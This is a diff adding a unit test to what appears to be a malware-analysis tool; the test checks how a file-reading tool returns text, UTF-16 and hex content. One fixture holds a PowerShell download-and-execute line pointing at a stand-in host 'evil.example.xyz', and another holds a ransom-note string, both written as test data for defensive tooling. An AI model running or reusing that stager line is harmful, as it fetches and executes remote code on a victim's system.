@@ -306,3 +306,42 @@ def test_virtualbox_availability(monkeypatch):
     assert VirtualBoxSandbox().available is True
     monkeypatch.setattr(config, "VM_SNAPSHOT", "other")
     assert VirtualBoxSandbox().available is False
+
+
+def test_read_file_text_hex_and_bounds(tmp_path):
+    from malloop.evidence import Run
+    from malloop.sandbox.base import NoSandbox
+    from malloop.tools import READ_MAX_BYTES, TOOLS, ToolExecutor
+
+    script = tmp_path / "stage1.ps1"
+    script.write_text("$u='http://evil.example.xyz/p'\nIEX (New-Object Net.WebClient).DownloadString($u)\n" * 200)
+    wide = tmp_path / "note.txt"
+    wide.write_bytes("﻿Your files are encrypted".encode("utf-16-le"))
+    binary = tmp_path / "blob.bin"
+    binary.write_bytes(bytes(range(256)) * 20)
+    nodes = [
+        {"id": "n0", "name": "stage1.ps1", "path": str(script), "type": "script", "duplicate_of": None},
+        {"id": "n1", "name": "note.txt", "path": str(wide), "type": "unknown", "duplicate_of": None},
+        {"id": "n2", "name": "blob.bin", "path": str(binary), "type": "unknown", "duplicate_of": None},
+    ]
+    run = Run.create(tmp_path / "runs", script, "0" * 64)
+    ex = ToolExecutor(run, None, NoSandbox(), [], nodes, {}, nodes[0])
+
+    r = ex.execute("read_file", {})
+    assert r["encoding"] == "text" and r["content"].startswith("$u='http://evil.example.xyz/p'")
+    assert r["returned_bytes"] == 4000 and r["eof"] is False
+
+    r = ex.execute("read_file", {"offset": 10**9, "length": 10**9})   # clamped, past EOF
+    assert r["returned_bytes"] == 0 and r["eof"] is True
+    r = ex.execute("read_file", {"length": 10**9})
+    assert r["returned_bytes"] == READ_MAX_BYTES
+
+    ex.target = nodes[1]
+    r = ex.execute("read_file", {})
+    assert r["encoding"] == "text" and "Your files are encrypted" in r["content"]
+
+    ex.target = nodes[2]
+    r = ex.execute("read_file", {"offset": 16, "length": 5000})
+    assert r["encoding"] == "hex" and r["returned_bytes"] == 1024
+    assert r["content"].splitlines()[0].startswith("00000010  10 11 12 13")
+    assert "read_file" in {t["name"] for t in TOOLS}
